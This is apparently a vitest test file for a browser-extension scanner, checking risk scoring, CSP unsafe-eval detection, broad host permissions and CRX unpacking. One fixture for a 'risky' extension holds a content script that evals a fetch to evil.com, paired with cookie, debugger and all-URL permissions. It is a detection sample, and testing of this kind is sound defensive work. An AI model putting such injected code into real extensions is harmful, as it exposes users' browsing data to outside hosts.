import { describe, it, expect } from 'vitest'
import { extractExtension, generateScanReport } from 'extension-shield-scanner'
import type { ScanInput } from 'extension-shield-scanner'
import { zipSync, strToU8 } from 'fflate'

function makeZip(files: Record<string, string>): ArrayBuffer {
  const entries: Record<string, Uint8Array> = {}
  for (const [name, content] of Object.entries(files)) {
    entries[name] = strToU8(content)
  }
  return zipSync(entries).buffer
}

describe('Extension Shield: extract + scan pipeline', () => {
  it('scans a safe extension and returns low risk', async () => {
    const manifest = JSON.stringify({
      manifest_version: 3, name: 'Safe Ext', version: '1.0.0',
      permissions: ['storage', 'activeTab'],
      host_permissions: [],
    })
    const buf = makeZip({ 'manifest.json': manifest })
    const { manifest: m, files } = await extractExtension(buf)
    const report = generateScanReport({ manifest: m as any, files })
    expect(report.riskLevel).toBe('low')
    expect(report.riskScore).toBeLessThanOrEqual(30)
    expect(report.extensionName).toBe('Safe Ext')
    expect(report.summary.critical).toBe(0)
  })

  it('scans a risky extension and returns high/critical risk', async () => {
    const manifest = JSON.stringify({
      manifest_version: 2, name: 'Risky Ext', version: '2.0.0',
      permissions: ['<all_urls>', 'tabs', 'cookies', 'webRequest', 'debugger'],
      host_permissions: ['<all_urls>'],
      content_security_policy: "script-src 'self' 'unsafe-eval'",
      content_scripts: [{ matches: ['<all_urls>'], js: ['inject.js'] }],
    })
    const buf = makeZip({
      'manifest.json': manifest,
      'inject.js': 'eval("fetch(\\"http://evil.com\\")");',
    })
    const { manifest: m, files } = await extractExtension(buf)
    const report = generateScanReport({ manifest: m as any, files })
    expect(report.riskLevel).toBeOneOf(['high', 'critical'])
    expect(report.riskScore).toBeGreaterThan(40)
    expect(report.permissions.dangerous.length).toBeGreaterThan(0)
  })

  it('detects unsafe-eval in CSP', async () => {
    const manifest = JSON.stringify({
      manifest_version: 3, name: 'Eval Ext', version: '1.0.0',
      permissions: ['storage'],
      host_permissions: [],
      content_security_policy: { extension_pages: "script-src 'self' 'unsafe-eval'" },
    })
    const buf = makeZip({ 'manifest.json': manifest })
    const { manifest: m, files } = await extractExtension(buf)
    const report = generateScanReport({ manifest: m as any, files })
    expect(report.csp.hasUnsafeEval).toBe(true)
  })

  it('detects broad host permissions', async () => {
    const manifest = JSON.stringify({
      manifest_version: 3, name: 'Broad Ext', version: '1.0.0',
      permissions: ['storage'],
      host_permissions: ['<all_urls>'],
    })
    const buf = makeZip({ 'manifest.json': manifest })
    const { manifest: m, files } = await extractExtension(buf)
    const report = generateScanReport({ manifest: m as any, files })
    expect(report.permissions.broadHostPermissions).toContain('<all_urls>')
  })

  it('throws on missing manifest.json', async () => {
    const buf = makeZip({ 'readme.txt': 'no manifest' })
    await expect(extractExtension(buf)).rejects.toThrow('No manifest.json')
  })

  it('extracts CRX format', async () => {
    const manifest = JSON.stringify({
      manifest_version: 3, name: 'CRX Ext', version: '1.0.0',
      permissions: ['storage'],
      host_permissions: [],
    })
    // Build a minimal CRX3 header + zip payload
    const zipData = zipSync({ 'manifest.json': strToU8(manifest) })
    const headerSize = 0
    const crxHeader = new ArrayBuffer(12 + headerSize)
    const view = new DataView(crxHeader)
    // Magic: Cr24
    new Uint8Array(crxHeader).set([0x43, 0x72, 0x32, 0x34])
    view.setUint32(4, 3, true) // version 3
    view.setUint32(8, headerSize, true) // header size
    const fullCrx = new Uint8Array(12 + headerSize + zipData.length)
    fullCrx.set(new Uint8Array(crxHeader))
    fullCrx.set(zipData, 12 + headerSize)

    const { manifest: m, format } = await extractExtension(fullCrx.buffer)
    expect(format).toBe('crx')
    expect((m as any).name).toBe('CRX Ext')
  })
})
